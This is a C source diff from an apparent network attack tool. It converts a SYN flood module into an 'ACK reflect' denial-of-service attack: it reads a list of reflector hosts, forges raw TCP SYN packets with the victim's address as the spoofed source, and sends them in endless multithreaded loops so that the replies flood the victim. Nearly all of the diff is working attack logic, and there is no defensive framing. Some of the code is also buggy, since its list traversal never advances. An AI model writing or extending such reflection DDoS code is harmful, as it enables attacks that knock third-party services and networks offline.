@@ -21,23 +21,22 @@
 #include <sys/types.h>
 #include <signal.h>
 
-#include "attack_syn_flood_dos.h"
 #include "../main.h"
+#include "attack_ack_reflect_dos.h"
 
-// from ../core/core_log.c
 extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
 extern int DisplayInfo(const char *fmt, ...);
 extern int DisplayWarning(const char *fmtsring, ...);
 extern int DisplayError(const char *fmt, ...);
 
+extern void FreeProcessACKIPListBuff(pStrHeader p);
+extern pStrHeader *ProcessACKIPListFile(pStrHeader *output);
 extern unsigned short CalculateSum(unsigned short *ptr, int nbytes);
+extern int LocateStrNodeElement(const pStrHeader p, pStrNode *element, const size_t loc);
 
-//int attack(const struct AHTTP_INPUT *ainput)
 static int SendSYN(const pSYNStruct ss, const int debug_level)
 {
-    // start attack now
-    // create a raw socke
-    // the program must run as root
+    // this belong to the ack reflect attack part
     int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     if (socket_fd < 0)
     {
@@ -199,84 +198,126 @@ static void FreeSYNStructBuff(pSYNStruct input)
     }
 }
 
+static int FindUnlockStrNode(pStrHeader p, char **ip)
+{
+    // find the unlocked str node element
+    // return the location
+
+    int loc;
+    pStrNode node;
+    for (loc = 1; loc <= p->length; loc++)
+    {
+        node = p->next;
+        if (node->lock == 0)
+        {
+            // means this node is unlocked
+            node->lock = 1;
+            (*ip) = node->str;
+            return loc;
+        }
+    }
+
+    // means failed
+    // need reinit the whole list node
+    return 0;
+}
+
+static void UnlockALlStrNode(pStrHeader p)
+{
+    // unlock all the str node
+    pStrNode node = p->next;
+    while (node)
+    {
+        node->lock = 0;
+        node = node->next;
+    }
+}
+
 static int AttackThread(pInput input)
 {
     // now we start the syn flood attack
     extern void FreeSplitURLBuff(pSplitURLOutput p);
     extern int SplitURL(const char *url, pSplitURLOutput *output);
-    extern void FreeRandomIPBuff(char *p);
-    extern char *GetRandomIP(char **output);
-    extern int GetRandomPort(int *output);
 
     pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
     pSplitURLOutput split_result;
     int i;
 
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "ATTACK!");
-    if (!SplitURL(input->address, &split_result))
-    {
-        DisplayError("AttackThread SplitURL failed");
-        return 1;
-    }
-    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
-    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
-    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
-    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);
-    if (split_result->port == 0)
-    {
-        if (strlen(split_result->host) == 0)
-        {
-            DisplayError("AttackThread SplitURL not right");
-            return 1;
-        }
-        // make the port as default
-        split_result->port = SYN_FLOOD_PORT_DEFAULT;
-    }
-    // init the target ip and port
-    syn_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
-    if (!(syn_struct->dst_ip))
-    {
-        DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
-        return 1;
-    }
-    if (!memset(syn_struct->dst_ip, 0, IP_BUFFER_SIZE))
-    {
-        DisplayError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
-        return 1;
-    }
-    if (!strncpy(syn_struct->dst_ip, split_result->host, strlen(split_result->host)))
-    {
-        DisplayError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
-        return 1;
-    }
-    syn_struct->dst_port = split_result->port;
-    FreeSplitURLBuff(split_result);
-    syn_struct->loop = input->each_ip_repeat;
 
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "AttackThread start sending data...");
+    char *address;
     for (;;)
     {
-        // here get the random ip address and port
-        if (input->random_sip_address == ENABLE_SIP)
+        if (!FindUnlockStrNode(input->str_header, &address))
         {
-            if (!GetRandomIP(&(syn_struct->src_ip)))
+            DisplayWarning("Reach end of the list");
+            UnlockALlStrNode(input->str_header);
+        }
+        if (!SplitURL(address, &split_result))
+        {
+            DisplayError("AttackThread SplitURL failed");
+            return 1;
+        }
+        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
+        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
+        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
+        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);
+
+        if (split_result->port == 0)
+        {
+            if (strlen(split_result->host) == 0)
             {
-                DisplayError("AttackThread GetRandomIP failed");
+                DisplayError("AttackThread SplitURL not right");
                 return 1;
             }
-            // this function has no failed
-            GetRandomPort(&(syn_struct->src_port));
+            // make the port as default
+            split_result->port = ACK_REFLECT_PORT_DEFAULT;
         }
-        // here we will use the default ip address and port
-        else
+        // init the target ip and port
+        syn_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
+        if (!(syn_struct->dst_ip))
         {
-            if (!strncpy(syn_struct->src_ip, DEFAULT_ADDRESS, strlen(DEFAULT_ADDRESS)))
+            DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
+            return 1;
+        }
+        if (!memset(syn_struct->dst_ip, 0, IP_BUFFER_SIZE))
+        {
+            DisplayError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
+            return 1;
+        }
+        if (!strncpy(syn_struct->dst_ip, split_result->host, strlen(split_result->host)))
+        {
+            DisplayError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
+            return 1;
+        }
+        syn_struct->dst_port = split_result->port;
+        FreeSplitURLBuff(split_result);
+        syn_struct->loop = input->each_ip_repeat;
+
+        /* split the target address as the traffic source ip address */
+        // make the source ip as the target ip address
+        if (!SplitURL(input->address, &split_result))
+        {
+            DisplayError("AttackThread SplitURL failed");
+            return 1;
+        }
+        if (split_result->port == 0)
+        {
+            if (strlen(split_result->host) == 0)
             {
-                DisplayError("AttackThread copy SIP_ADDRESS failed: %s(%d)", strerror(errno), errno);
+                DisplayError("AttackThread SplitURL not right");
                 return 1;
             }
-            syn_struct->src_port = (int)DEFAULT_PORT;
+            // make the port as default
+            split_result->port = ACK_REFLECT_PORT_DEFAULT;
         }
+        if (!strncpy(syn_struct->src_ip, input->address, strlen(input->address)))
+        {
+            DisplayError("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
+            return 1;
+        }
+        syn_struct->src_port = (int)split_result->port;
 
         // rport is random source port
         for (i = 0; i < input->each_ip_repeat; i++)
@@ -287,13 +328,13 @@ static int AttackThread(pInput input)
                 return 1;
             }
         }
-        FreeRandomIPBuff(syn_struct->src_ip);
+        FreeSplitURLBuff(split_result);
     }
     FreeSYNStructBuff(syn_struct);
     return 0;
 }
 
-int StartSYNFloodAttack(const pInput input)
+int StartACKReflectAttack(const pInput input)
 {
     // run function in thread
     // this attack type must run as root
@@ -304,10 +345,16 @@ int StartSYNFloodAttack(const pInput input)
     int i, j, ret;
     int status = 0;
 
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFloodAttack");
+    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
 
     extern void SignalExit(int signo);
     signal(SIGINT, SignalExit);
+
+    if (!ProcessACKIPListFile(&(input->str_header)))
+    {
+        DisplayError("ProcessACKIPListFile failed");
+        return 1;
+    }
     // unlimit loop
     for (;;)
     {
@@ -319,13 +366,13 @@ int StartSYNFloodAttack(const pInput input)
                 //input->serial_num = (i * input->max_thread) + j;
                 if (pthread_attr_init(&attr))
                 {
-                    DisplayError("StartSYNFloodAttack pthread_attr_init failed");
+                    DisplayError("StartSYNFlood pthread_attr_init failed");
                     return 1;
                 }
                 //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
                 if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
                 {
-                    DisplayError("StartSYNFloodAttack pthread_attr_setdetachstate failed");
+                    DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
                     return 1;
                 }
                 // create thread
@@ -363,13 +410,13 @@ int StartSYNFloodAttack(const pInput input)
                         //input->serial_num = (i * input->max_thread) + j;
                         if (pthread_attr_init(&attr))
                         {
-                            DisplayError("StartSYNFloodAttack pthread_attr_init failed");
+                            DisplayError("StartSYNFlood pthread_attr_init failed");
                             return 1;
                         }
                         //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
                         if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
                         {
-                            DisplayError("StartSYNFloodAttack pthread_attr_setdetachstate failed");
+                            DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
                             return 1;
                         }
                         // create thread
@@ -405,27 +452,23 @@ int StartSYNFloodAttack(const pInput input)
             }
         }
     }
+    FreeProcessACKIPListBuff(input->str_header);
     return 0;
 }
 
-int StartSYNFloodTest(const pInput input)
+int StartACKReflectTest(const pInput input)
 {
     // run function in thread
     // this attack type must run as root
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFloodTest");
+    pStrHeader header;
+    if (!ProcessACKIPListFile(&header))
+    {
+        DisplayError("ProcessACKIPListFile failed");
+        return 1;
+    }
+    input->str_header = header;
     AttackThread(input);
+    FreeProcessACKIPListBuff(header);
     return 0;
 }
-
-/*
-int main(void)
-{
-    // for test
-    pInput p = (pInput)malloc(sizeof(Input));
-    p->random_sip_address = ENABLE_SIP;
-    p->each_ip_repeat = 1024;
-    strcpy(p->address, "192.168.1.1:80");
-    SYNFloodAttack_Thread(p);
-    return 0;
-}
-*/
